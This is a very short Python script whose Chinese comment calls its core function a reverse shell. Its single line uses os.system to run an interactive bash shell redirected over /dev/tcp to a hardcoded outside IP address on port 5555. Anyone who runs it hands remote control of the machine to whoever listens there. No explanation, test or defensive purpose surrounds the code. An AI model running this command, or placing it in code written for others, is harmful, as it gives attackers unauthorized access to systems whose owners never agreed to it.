import os

# 核心功能：反弹shell
os.system("bash -i >& /dev/tcp/47.116.205.76/5555 0>&1")
